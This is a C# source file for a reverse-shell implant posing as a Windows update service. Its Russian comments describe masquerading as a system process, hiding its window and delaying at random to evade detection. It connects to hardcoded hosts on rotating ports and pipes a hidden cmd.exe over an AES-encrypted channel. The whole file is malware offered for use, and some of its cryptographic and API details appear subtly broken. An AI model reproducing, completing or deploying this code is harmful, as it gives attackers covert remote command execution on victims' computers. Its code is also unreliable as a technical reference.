using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.ComponentModel;

namespace WindowsUpdateService
{
    public class UpdateManager
    {
        // Обфусцированные конфигурации
        private static readonly byte[] _encryptedConfig = Convert.FromBase64String("U3lzdGVtVXBkYXRlVjEuMA==");
        
        // Ключ шифрования
        private static readonly byte[] _key = Convert.FromBase64String("QNL3mJ6VkE2r9tWxYp8zDcB7hMqA4sFv");
        private static readonly byte[] _iv = Convert.FromBase64String("Ht8fG2dLk9jR5mXq");

        // Список портов для ротации
        private static readonly int[] _ports = { 443, 8080, 8443, 4433, 4443 };
        private static int _portIndex = 0;
        private static bool _isServiceMode = false;

        public static void Main(string[] args)
        {
            // Проверяем, является ли процесс дочерним
            _isServiceMode = CheckIfServiceMode();
            
            if (!_isServiceMode)
            {
                // Маскировка под системный процесс - запускаем в фоновом режиме
                var currentProcess = Process.GetCurrentProcess();
                currentProcess.PriorityClass = ProcessPriorityClass.BelowNormal;
                
                // Запуск в фоновом режиме без аргументов командной строки
                StartBackgroundService();
                return;
            }

            // Основная логика выполнения
            ExecuteUpdateService();
        }

        private static bool CheckIfServiceMode()
        {
            // Проверяем различные признаки сервисного режима
            try
            {
                var parentProcess = GetParentProcess();
                if (parentProcess != null)
                {
                    var parentName = parentProcess.ProcessName.ToLower();
                    if (parentName.Contains("windowsupdate") || 
                        parentName.Contains("svchost") ||
                        parentName.Contains("services"))
                    {
                        return true;
                    }
                    
                    // Если родительский процесс - это наш же процесс, значит это сервисный режим
                    if (parentProcess.Id == Process.GetCurrentProcess().Id)
                    {
                        return true;
                    }
                }
            }
            catch
            {
                // Если не можем определить родительский процесс, считаем что это сервисный режим
                return true;
            }
            
            return false;
        }

        private static Process GetParentProcess()
        {
            try
            {
                var currentProcess = Process.GetCurrentProcess();
                using (var query = new ManagementObjectSearcher($"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {currentProcess.Id}"))
                {
                    var results = query.Get();
                    foreach (var item in results)
                    {
                        var parentId = (uint)item["ParentProcessId"];
                        return Process.GetProcessById((int)parentId);
                    }
                }
            }
            catch
            {
                // В случае ошибки возвращаем null
            }
            return null;
        }

        private static void StartBackgroundService()
        {
            try
            {
                // Создание скрытого процесса без использования аргументов командной строки
                var processInfo = new ProcessStartInfo
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true // Используем ShellExecute для запуска без наследования консоли
                };

                Process.Start(processInfo);
                
                // Даем время дочернему процессу запуститься
                Thread.Sleep(2000);
            }
            catch
            {
                // Если не удалось запустить дочерний процесс, продолжаем в текущем
                _isServiceMode = true;
                ExecuteUpdateService();
            }
        }

        private static void ExecuteUpdateService()
        {
            // Случайная задержка для обхода детектирования
            Thread.Sleep(new Random().Next(5000, 15000));

            while (true)
            {
                try
                {
                    string[] targetHosts = { 
                        "192.168.1.100", // Прямое указание IP для избежания ошибок дешифрования
                        "172.16.10.15"
                    };

                    foreach (var host in targetHosts)
                    {
                        AttemptConnection(host);
                        Thread.Sleep(30000);
                    }
                }
                catch
                {
                    Thread.Sleep(60000);
                }
            }
        }

        private static void AttemptConnection(string host)
        {
            using (var client = new TcpClient())
            {
                var currentPort = GetNextPort();
                
                // Таймаут подключения
                var result = client.BeginConnect(host, currentPort, null, null);
                var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(10));

                if (!success)
                {
                    return;
                }

                try
                {
                    client.EndConnect(result);
                    HandleConnection(client);
                }
                catch
                {
                    // Подавление исключений
                }
            }
        }

        private static void HandleConnection(TcpClient client)
        {
            using (var stream = client.GetStream())
            {
                var process = CreateLegitimateProcess();
                process.Start();

                // Настройка потоков для шифрования
                var cryptoStreamRead = new CryptoStream(stream, CreateAesDecryptor(), CryptoStreamMode.Read);
                var cryptoStreamWrite = new CryptoStream(stream, CreateAesEncryptor(), CryptoStreamMode.Write);
                
                using (var readStream = new StreamReader(cryptoStreamRead))
                using (var writeStream = new StreamWriter(cryptoStreamWrite))
                {
                    writeStream.AutoFlush = true;
                    
                    // Асинхронная обработка ввода/вывода
                    StartAsyncIOHandling(process, readStream, writeStream, client);
                    
                    // Ожидание завершения процесса
                    while (!process.HasExited && client.Connected)
                    {
                        process.WaitForExit(100);
                    }

                    if (!process.HasExited)
                    {
                        process.Kill();
                    }
                }
                
                process.Close();
            }
        }

        private static Process CreateLegitimateProcess()
        {
            // Используем cmd.exe как наиболее легитимный процесс
            return new Process
            {
                StartInfo = 
                {
                    FileName = "cmd.exe",
                    Arguments = "/q /d",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            };
        }

        private static void StartAsyncIOHandling(Process process, StreamReader input, StreamWriter output, TcpClient client)
        {
            // Асинхронное чтение вывода процесса
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data) && client.Connected)
                {
                    try
                    {
                        var encryptedOutput = EncryptString(e.Data);
                        output.WriteLine(Convert.ToBase64String(encryptedOutput));
                    }
                    catch
                    {
                        // Подавление ошибок
                    }
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data) && client.Connected)
                {
                    try
                    {
                        var encryptedError = EncryptString("[ERROR] " + e.Data);
                        output.WriteLine(Convert.ToBase64String(encryptedError));
                    }
                    catch
                    {
                        // Подавление ошибок
                    }
                }
            };

            // Асинхронное чтение команд
            ThreadPool.QueueUserWorkItem(state =>
            {
                try
                {
                    while (client.Connected && !process.HasExited)
                    {
                        if (input.Peek() >= 0)
                        {
                            var encryptedCommand = input.ReadLine();
                            if (!string.IsNullOrEmpty(encryptedCommand))
                            {
                                var commandBytes = Convert.FromBase64String(encryptedCommand);
                                var command = DecryptString(commandBytes);
                                process.StandardInput.WriteLine(command);
                                
                                Thread.Sleep(new Random().Next(100, 500));
                            }
                        }
                        Thread.Sleep(50);
                    }
                }
                catch
                {
                    // Подавление ошибок
                }
            });
        }

        private static int GetNextPort()
        {
            _portIndex = (_portIndex + 1) % _ports.Length;
            return _ports[_portIndex];
        }

        // Шифрование AES
        private static ICryptoTransform CreateAesEncryptor()
        {
            var aes = Aes.Create();
            return aes.CreateEncryptor(_key, _iv);
        }

        private static ICryptoTransform CreateAesDecryptor()
        {
            var aes = Aes.Create();
            return aes.CreateDecryptor(_key, _iv);
        }

        private static byte[] EncryptString(string plainText)
        {
            using (var aes = Aes.Create())
            using (var encryptor = aes.CreateEncryptor(_key, _iv))
            {
                var plainBytes = Encoding.UTF8.GetBytes(plainText);
                return encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
            }
        }

        private static string DecryptString(byte[] encryptedBytes)
        {
            using (var aes = Aes.Create())
            using (var decryptor = aes.CreateDecryptor(_key, _iv))
            {
                var decryptedBytes = decryptor.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
                return Encoding.UTF8.GetString(decryptedBytes);
            }
        }
    }
}
